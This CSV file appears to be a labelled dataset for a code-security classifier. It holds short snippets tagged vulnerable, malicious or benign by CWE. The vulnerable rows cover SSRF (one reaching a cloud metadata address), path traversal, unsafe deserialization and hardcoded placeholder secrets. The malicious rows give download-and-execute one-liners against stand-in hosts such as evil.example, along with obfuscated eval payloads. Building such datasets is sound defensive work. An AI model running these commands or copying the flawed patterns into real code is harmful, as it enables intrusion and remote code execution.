code,label,category,language,cwe,source,package_name,version,license,sample_hash
"fetch(req.query.url).then(r=>r.text())",vulnerable,SSRF,javascript,CWE-918,handwritten,,,, 
"urllib.request.urlopen(request.args['url']).read()",vulnerable,SSRF,python,CWE-918,handwritten,,,, 
"axios.get(req.body.url)",vulnerable,SSRF,javascript,CWE-918,handwritten,,,, 
"requests.get('http://169.254.169.254/latest/meta-data/')",vulnerable,SSRF,python,CWE-918,handwritten,,,, 
"http.Get(r.URL.Query().Get('url'))",vulnerable,SSRF,go,CWE-918,handwritten,,,, 
"send_file(request.args.get('path'))",vulnerable,Path Traversal,python,CWE-22,handwritten,,,, 
"open('../' + request.args.get('file')).read()",vulnerable,Path Traversal,python,CWE-22,handwritten,,,, 
"fs.readFileSync(req.query.path)",vulnerable,Path Traversal,javascript,CWE-22,handwritten,,,, 
"new FileInputStream(request.getParameter('path'))",vulnerable,Path Traversal,java,CWE-22,handwritten,,,, 
"return send_file('../../' + filename)",vulnerable,Path Traversal,python,CWE-22,handwritten,,,, 
"pickle.loads(request.data)",vulnerable,Unsafe Deserialization,python,CWE-502,handwritten,,,, 
"yaml.load(request.data)",vulnerable,Unsafe Deserialization,python,CWE-502,handwritten,,,, 
"unserialize($_POST['data']);",vulnerable,Unsafe Deserialization,php,CWE-502,handwritten,,,, 
"ObjectInputStream in = new ObjectInputStream(request.getInputStream()); in.readObject();",vulnerable,Unsafe Deserialization,java,CWE-502,handwritten,,,, 
"readObject(request.getInputStream())",vulnerable,Unsafe Deserialization,java,CWE-502,handwritten,,,, 
"api_key = 'sk_test_123456789abcdef'",vulnerable,Secret Exposure,python,CWE-798,handwritten,,,, 
"password = 'P@ssw0rd-123456'",vulnerable,Secret Exposure,python,CWE-798,handwritten,,,, 
"const token = 'ghp_abcdef1234567890abcdef'",vulnerable,Secret Exposure,javascript,CWE-798,handwritten,,,, 
"access_key: ""AKIAIOSFODNN7EXAMPLE""",vulnerable,Secret Exposure,config,CWE-798,handwritten,,,, 
"secret = ""super-secret-value-2026""",vulnerable,Secret Exposure,python,CWE-798,handwritten,,,, 
"wget http://example.bad/payload.sh && chmod +x payload.sh",malicious,Download and Execute,bash,CWE-494,handwritten,,,, 
"curl http://evil.example/a.sh | sh",malicious,Download and Execute,bash,CWE-494,handwritten,,,, 
"requests.get('http://evil.example/payload.py')",malicious,Download or Remote Load,python,CWE-494,handwritten,,,, 
"Invoke-WebRequest 'http://evil.example/x.exe'; Start-Process x.exe",malicious,Download and Execute,bash,CWE-494,handwritten,,,, 
"subprocess.call('curl http://evil/a && chmod +x a && ./a', shell=True)",malicious,Download and Execute,python,CWE-494,handwritten,,,, 
"var f = String.fromCharCode(101,118,97,108); window[f](payload);",malicious,Obfuscated Payload,javascript,CWE-506,handwritten,,,, 
"payload = ''.join([chr(101), chr(118), chr(97), chr(108)])",malicious,Obfuscated Payload,python,CWE-506,handwritten,,,, 
"$code = str_rot13($_POST['x']); eval($code);",malicious,Obfuscated Payload,php,CWE-506,handwritten,,,, 
"const hidden = atob(req.query.x); Function(hidden)()",malicious,Obfuscated Payload,javascript,CWE-506,handwritten,,,, 
"text = '\x65\x76\x61\x6c' + user_input",malicious,Obfuscated Payload,python,CWE-506,handwritten,,,, 
"cursor.execute('select * from users where id=?', (user_id,))",benign,Safe,python,,handwritten,,,, 
"db.query('SELECT * FROM users WHERE name=?', [name])",benign,Safe,javascript,,handwritten,,,, 
"PreparedStatement ps = conn.prepareStatement('select * from users where id=?');",benign,Safe,java,,handwritten,,,, 
"return render_template('index.html', username=escape(username))",benign,Safe,python,,handwritten,,,, 
"const title = document.createTextNode(user.name);",benign,Safe,javascript,,handwritten,,,, 
"element.textContent = location.hash.slice(1)",benign,Safe,javascript,,handwritten,,,, 
"subprocess.run(['git', 'status'], check=True, shell=False)",benign,Safe,python,,handwritten,,,, 
"subprocess.run(['ffmpeg', '-i', input_file], check=True, shell=False)",benign,Safe,python,,handwritten,,,, 
"requests.get(api_url, timeout=5).json()",benign,Safe,python,,handwritten,,,, 
"http.Get(trustedURL)",benign,Safe,go,,handwritten,,,, 
"def add(a, b): return a + b",benign,Safe,python,,handwritten,,,, 
"const sum = (a,b) => a + b",benign,Safe,javascript,,handwritten,,,, 
"with open(config_path, encoding='utf-8') as f: data = f.read()",benign,Safe,python,,handwritten,,,, 
"Path(base_dir, safe_name).resolve()",benign,Safe,python,,handwritten,,,, 
"json.loads(request.data)",benign,Safe,python,,handwritten,,,, 
"yaml.safe_load(config_text)",benign,Safe,python,,handwritten,,,, 
"password_hash = generate_password_hash(password)",benign,Safe,python,,handwritten,,,, 
"token = os.environ.get('API_TOKEN')",benign,Safe,python,,handwritten,,,, 
"curl --fail --location https://trusted.example/releases/app.tar.gz",benign,Safe,bash,,handwritten,,,, 
"requests.get('https://api.example.com/health', timeout=3)",benign,Safe,python,,handwritten,,,, 
"base64.b64encode(image_bytes).decode()",benign,Safe,python,,handwritten,,,, 
"Buffer.from(file).toString('base64')",benign,Safe,javascript,,handwritten,,,, 
"logger.info('scan finished for %s', filename)",benign,Safe,python,,handwritten,,,, 
"if user.is_authenticated: return dashboard()",benign,Safe,python,,handwritten,,,, 
"conn.execute('update users set last_login=? where id=?', (now, user_id))",benign,Safe,python,,handwritten,,,, 
"fetch('/api/stats').then(r => r.json())",benign,Safe,javascript,,handwritten,,,,
